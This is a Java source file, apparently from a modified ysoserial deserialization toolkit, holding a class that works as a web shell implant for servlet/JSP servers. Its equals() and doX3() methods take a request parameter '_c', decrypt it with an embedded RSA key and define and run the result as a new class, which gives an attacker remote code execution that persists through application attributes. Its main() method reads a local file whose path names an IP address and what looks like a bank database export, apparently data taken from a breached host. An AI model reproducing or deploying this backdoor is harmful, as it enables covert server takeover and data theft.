package ysoserial.payloads.util;

import java.io.FileInputStream;
import java.io.OutputStream;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.xml.bind.DatatypeConverter;

public class PE2 {
   PageContext pageContext;
   HttpServletRequest request;
   HttpServletResponse response;
   OutputStream out;
   HttpSession session;
   ServletContext application;
   private String szCodeNmae = "_c";

   public PE2() {
   }

   private byte[] decode(String var1) {
      Object var2 = null;
      Object var3 = null;

      try {
         byte[] var12 = DatatypeConverter.parseBase64Binary(var1);
         String var4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzIh9VZUpap95dabZMb6OKeE3vy1Kjv/+6BeuZhjTXn9z8uF/OGH2sVd1tfELdVrljR2OxZDKUARd1s9rWrMuiIqPfp7idiUtOFL6lc2/dEaeaKqV37JIXbrVBOpvDVKCRp7RPfwBxOHj8wT8JSNYcwDrgXg7PsEGizyQ2Cxx2acu8hq/+qenkSz9DbANgms/A3ur8KfN1nMYDpuG+mhVeAyKcJmwR72mRyotRNSSFSm3NcM/er6LxH9BDqVfSo+Fkk+ribE483uZks9IpYmVcH+8TnHvGjHcuk+KjvrgSsYsFxEOwfEsnoRbS8hNlXb4bgWXuBjIPAqXI8O54SJkrwIDAQAB";
         KeyFactory var5 = KeyFactory.getInstance("RSA");
         byte[] var6 = DatatypeConverter.parseBase64Binary(var4);
         X509EncodedKeySpec var7 = new X509EncodedKeySpec(var6);
         PublicKey var8 = var5.generatePublic(var7);
         Cipher var9 = Cipher.getInstance("RSA/ECB/PKCS1PADDING");
         var9.init(2, var8);
         byte[] var11 = var9.doFinal(var12);
         return var11;
      } catch (Exception var10) {
         return (byte[])var3;
      }
   }

   private byte[] encode(byte[] var1) {
      Object var2 = null;
      byte[] var3 = var1;

      try {
         String var4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzIh9VZUpap95dabZMb6OKeE3vy1Kjv/+6BeuZhjTXn9z8uF/OGH2sVd1tfELdVrljR2OxZDKUARd1s9rWrMuiIqPfp7idiUtOFL6lc2/dEaeaKqV37JIXbrVBOpvDVKCRp7RPfwBxOHj8wT8JSNYcwDrgXg7PsEGizyQ2Cxx2acu8hq/+qenkSz9DbANgms/A3ur8KfN1nMYDpuG+mhVeAyKcJmwR72mRyotRNSSFSm3NcM/er6LxH9BDqVfSo+Fkk+ribE483uZks9IpYmVcH+8TnHvGjHcuk+KjvrgSsYsFxEOwfEsnoRbS8hNlXb4bgWXuBjIPAqXI8O54SJkrwIDAQAB";
         KeyFactory var5 = KeyFactory.getInstance("RSA");
         byte[] var6 = DatatypeConverter.parseBase64Binary(var4);
         X509EncodedKeySpec var7 = new X509EncodedKeySpec(var6);
         PublicKey var8 = var5.generatePublic(var7);
         Cipher var9 = Cipher.getInstance("RSA/ECB/PKCS1PADDING");
         var9.init(2, var8);
         byte[] var11 = var9.doFinal(var3);
         return var11;
      } catch (Exception var10) {
         return null;
      }
   }

   public static byte[] encrypt(byte[] var0, String var1, int var2) {
      try {
         SecureRandom var3 = new SecureRandom();
         DESKeySpec var4 = new DESKeySpec(var1.getBytes());
         SecretKeyFactory var5 = SecretKeyFactory.getInstance("DES");
         SecretKey var6 = var5.generateSecret(var4);
         Cipher var7 = Cipher.getInstance("DES");
         var7.init(var2, var6, var3);
         byte[] var8 = var7.doFinal(var0);
         return var8;
      } catch (Throwable var9) {
         return null;
      }
   }

   public static void main(String[] var0) throws Exception {
      FileInputStream var1 = new FileInputStream("/Users/0x101/Downloads/myDcocker/data/118.122.251.6_9000/GZBCB_NEW.ODBC_IMPORT.txt");
      int var2 = 102400;
      boolean var3 = false;
      byte[] var4 = new byte[var2];
      int var7 = var1.read(var4, 0, var2);
      System.out.println(var7);
      new PE2();
      byte[] var6 = encrypt(var4, "/Users/0x101/Downloads/myDcocker/data/118.122.251.6_9000/GZBCB_NEW.ODBC_IMPORT.txt", 1);
      var6 = encrypt(var6, "/Users/0x101/Downloads/myDcocker/data/118.122.251.6_9000/GZBCB_NEW.ODBC_IMPORT.txt", 2);
      System.out.println(new String(var6));
   }

   private void doX3() {
      String var1 = this.request.getParameter(this.szCodeNmae);
      if (var1 == null && this.session != null) {
         var1 = (String)this.session.getAttribute(this.szCodeNmae);
      }

      if (var1 == null && this.application.getAttribute(this.szCodeNmae + "_") != null) {
         var1 = (String)this.application.getAttribute(this.szCodeNmae + "_");
      }

      if (var1 != null) {
         try {
            this.application.setAttribute(this.szCodeNmae + "_", var1);
//            Class.forName("ysoserial.payloads.util.PE2.U").newInstance().
            (new ysoserial.payloads.util.PE2.U(this.getClass().getClassLoader())).g(this.decode(var1)).newInstance().equals(this.pageContext);
         } catch (Exception var3) {
         }
      }

   }

   public boolean equals(Object var1) {
      if (var1 instanceof PageContext) {
         try {
            this.pageContext = (PageContext)var1;
            this.application = this.pageContext.getServletContext();
            this.request = (HttpServletRequest)this.pageContext.getRequest();
            this.response = (HttpServletResponse)this.pageContext.getResponse();
            this.out = this.response.getOutputStream();
            this.session = this.request.getSession(false);
            if (this.session == null) {
               this.session = this.request.getSession(true);
            }

            this.doX3();
         } catch (Exception var3) {
         }
      }

      return true;
   }

   public class U extends ClassLoader {
      public U(ClassLoader c){
         super(c);
      }
      public Class g(byte[] b) {
         return super.defineClass(b, 0, b.length);
      }}
}
